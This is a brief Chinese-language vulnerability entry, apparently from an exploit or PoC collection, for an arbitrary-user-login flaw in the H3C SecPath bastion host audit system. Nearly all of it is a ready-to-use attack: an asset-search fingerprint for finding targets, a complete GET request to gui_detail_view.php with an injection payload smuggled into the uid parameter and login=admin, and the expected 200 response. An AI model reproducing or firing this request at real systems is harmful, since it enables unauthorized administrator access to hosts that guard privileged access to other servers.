# H3CSecParh堡垒机任意用户登录漏洞

H3CSecParh ｜ 其他 ｜ —
- **指纹**：`app="H3C-SecPath-运维审计系统"`
- **请求**：`GET /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin HTTP/1.1`
- **响应特征**：200